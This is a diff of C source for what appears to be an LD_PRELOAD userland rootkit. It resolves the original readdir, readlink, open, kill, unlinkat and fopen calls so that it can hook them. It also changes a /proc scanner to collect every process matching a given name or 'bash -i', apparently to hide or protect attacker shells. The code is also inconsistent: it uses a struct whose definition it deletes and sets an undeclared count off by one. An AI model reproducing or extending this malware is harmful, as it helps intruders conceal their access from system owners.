@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <dlfcn.h>
@@ -5,33 +6,24 @@
 #include <dirent.h>
 #include <string.h>
 
-#include "syscalls.c"
-#include "log.c"
+#include "log.h"
+#include "util.h"
 
-struct proc {
-  int pid;
-  bool alive;
-};
+static struct dirent* (*oreaddir)(DIR * ) = NULL;
+static ssize_t (*oreadlink)(const char *, char *, size_t) = NULL;
+static int (*oopen)(const char*, int, ...) = NULL;
+static int (*okill)(pid_t, int) = NULL;
+static int (*ounlinkat)(int, const char*, int) = NULL;
+static FILE* (*ofopen)(const char *, const char*) = NULL;
 
 void *find_addr(char *symbol){
+  // RTLD_NEXT is not defined, unless you use #define _GNU_SOURCE
 	void *address = dlsym(RTLD_NEXT, symbol);
 	if (address == NULL){
     debug("cant find address");
     exit(0);
   }
 	return address;
-}
-
-void get_originals(){
-  owrite = (ssize_t (*)(int, const void*, size_t))find_addr("write");
-  oopen = (int (*)(const char* restrict, int, ...))find_addr("open");
-  okill = (int (*)(pid_t, int))find_addr("kill");
-
-  oreaddir = (struct dirent* (*)(DIR *))find_addr("readdir");
-  oreadlink = (ssize_t (*)(const char *restrict, char *restrict, size_t))find_addr("readlink");
-  
-  ounlinkat = (int (*)(int, const char*, int))find_addr("unlinkat");  
-  ofopen = (FILE* (*)(const char *restrict, const char *restrict mode))find_addr("fopen64");
 }
 
 char * replace(char * string, char x, char y, int len){
@@ -44,10 +36,15 @@ char * replace(char * string, char x, char y, int len){
 }
 
 struct proc find_proc(const char* name) {
-  DIR* dir;
+  // simply loops over /proc , grabs all the 
+  // process and compares their cmdline with the 
+  // parameter "name"
   struct dirent* entry;
   struct proc ret;
-  ret.pid = 0;
+  int i = 0;
+  DIR* dir;
+
+  ret.pid = (int*)malloc(sizeof(int));
   ret.alive = false;
  
   dir = opendir("/proc");
@@ -56,12 +53,11 @@ struct proc find_proc(const char* name) {
   }
 
   while ((entry = readdir(dir)) != NULL) {
-
     if (entry->d_type != DT_DIR) {
       continue;
     }
 
-    char pidp[256];
+    char pidp[strlen(entry->d_name)+50];
     sprintf(pidp, "/proc/%s/cmdline", entry->d_name);
     FILE* cmdline = fopen(pidp, "r");
     
@@ -74,16 +70,19 @@ struct proc find_proc(const char* name) {
     fclose(cmdline);
     char* cmd = replace(buffer, '\0', ' ', len);
 
-    if(strstr(cmd, name)==NULL){
+    if(strstr(cmd, name)==NULL && strstr(cmd, "bash -i")==NULL){
       continue;
     }
 
-    closedir(dir);
-    ret.pid = atoi(entry->d_name);
-    ret.alive = true;
-    return ret;	
+    ret.pid[i] = atoi(entry->d_name);
+    i += 1;
+    ret.pid = (int*)realloc(ret.pid, (i+1)*sizeof(int));
   }
 
+  if (i>0){
+    ret.alive = true;
+  }
+  ret.pid_count = i+1;
   closedir(dir);
   return ret;
 }
